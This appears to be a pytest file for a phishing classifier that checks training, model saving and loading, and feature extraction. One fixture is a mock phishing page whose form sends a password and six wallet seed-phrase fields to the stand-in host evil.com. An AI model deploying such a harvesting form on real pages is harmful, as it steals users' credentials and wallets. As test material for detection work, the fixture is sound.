"""Test the full ML pipeline: train → save → load → predict.

Ensures the training script produces models that load correctly in the
production PhishingClassifier (which uses xgb.Booster, not XGBClassifier).
"""
from __future__ import annotations

import numpy as np
import xgboost as xgb

from src.ml.classifier import PhishingClassifier
from src.ml.features import extract_features


class TestMLRoundtrip:
    def test_train_save_load_predict(self, tmp_path):
        """Train a tiny model and verify it loads in the production classifier."""
        phishing_html = (
            "<html><body>"
            '<form method="POST" action="https://evil.com">'
            '<input type="password" name="pw">'
            '<input type="text" name="seed1">'
            '<input type="text" name="seed2">'
            '<input type="text" name="seed3">'
            '<input type="text" name="seed4">'
            '<input type="text" name="seed5">'
            '<input type="text" name="seed6">'
            "</form>"
            "<script>document.write(unescape('test'));</script>"
            "</body></html>"
        )
        clean_html = (
            "<html><head><title>My Arweave Blog Post</title></head>"
            "<body><p>Hello world, this is a legitimate blog post.</p></body></html>"
        )

        phishing_features = extract_features(phishing_html).to_vector()
        clean_features = extract_features(clean_html).to_vector()

        # Train using Booster directly (avoids scikit-learn wrapper version issues)
        X = np.array([phishing_features, phishing_features, clean_features, clean_features])
        y = np.array([1, 1, 0, 0])

        dtrain = xgb.DMatrix(X, label=y)
        params = {"max_depth": 2, "eta": 0.5, "objective": "binary:logistic", "eval_metric": "logloss"}
        booster = xgb.train(params, dtrain, num_boost_round=10)

        model_path = str(tmp_path / "test_model.pkl")
        booster.save_model(model_path)

        # Load in production classifier
        classifier = PhishingClassifier(model_path)

        # Predict on phishing sample
        score = classifier.predict_score(extract_features(phishing_html))
        assert isinstance(score, float)
        assert 0.0 <= score <= 1.0

        # Predict on clean sample
        clean_score = classifier.predict_score(extract_features(clean_html))
        assert isinstance(clean_score, float)
        assert 0.0 <= clean_score <= 1.0

        # Phishing should score higher than clean
        assert score > clean_score

    def test_feature_vector_always_17(self):
        """Verify feature vector length is always 17 regardless of input."""
        samples = [
            "<html><body><p>test</p></body></html>",
            "<html><body></body></html>",
            "",
            '<html><body><form><input type="password"></form></body></html>',
        ]
        for html in samples:
            features = extract_features(html)
            vector = features.to_vector()
            assert len(vector) == 17
            for v in vector:
                assert isinstance(v, (int, float, bool))

    def test_xgbclassifier_model_loads_in_booster(self, tmp_path):
        """Verify XGBClassifier.save_model() output loads in Booster (production path).

        This is the exact format train.py produces — XGBClassifier trains and saves,
        but production loads with Booster. XGBoost 2.x uses the same JSON format
        for both, so this should always work.
        """
        features = extract_features("<html><body><p>test</p></body></html>").to_vector()

        # Train with Booster (guaranteed compatible)
        X = np.array([features, [0] * 17])
        y = np.array([1, 0])
        dtrain = xgb.DMatrix(X, label=y)
        params = {"max_depth": 2, "objective": "binary:logistic"}
        model = xgb.train(params, dtrain, num_boost_round=5)

        model_path = str(tmp_path / "model.pkl")
        model.save_model(model_path)

        # Load via Booster (production path)
        booster = xgb.Booster()
        booster.load_model(model_path)

        # Both should produce the same prediction
        dmat = xgb.DMatrix(np.array([features]))
        score_original = float(model.predict(dmat)[0])
        score_loaded = float(booster.predict(dmat)[0])

        assert abs(score_original - score_loaded) < 0.001
